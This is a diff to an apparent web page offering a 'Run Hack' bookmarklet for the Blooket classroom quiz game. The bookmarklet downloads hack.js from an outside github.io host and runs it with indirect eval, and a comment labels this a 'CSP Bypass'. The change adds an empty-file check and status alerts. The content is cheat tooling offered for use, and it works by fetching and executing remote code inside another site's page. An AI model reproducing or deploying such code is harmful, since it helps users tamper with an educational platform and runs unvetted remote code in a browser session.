@@ -41,11 +41,18 @@
         <p>📌 Drag the button below to your bookmarks bar:</p>
         <a class="bookmarklet" href="javascript:(function(){
             alert('✅ Hack Activated!');
-            
+
             fetch('https://vasiliy809.github.io/blooket-hacks/hack.js')
                 .then(response => response.text())
-                .then(code => (1,eval)(code)) // CSP Bypass
-                .catch(error => alert('❌ Failed to load hack.js! Check the link.'));
+                .then(code => {
+                    if (code.trim().length > 0) {
+                        (1,eval)(code); // CSP Bypass
+                        alert('⚡ Hack.js loaded and executed!');
+                    } else {
+                        alert('❌ Error: hack.js is empty!');
+                    }
+                })
+                .catch(error => alert('❌ Failed to load hack.js: ' + error));
         })();">
             ⚡ Run Hack
         </a>
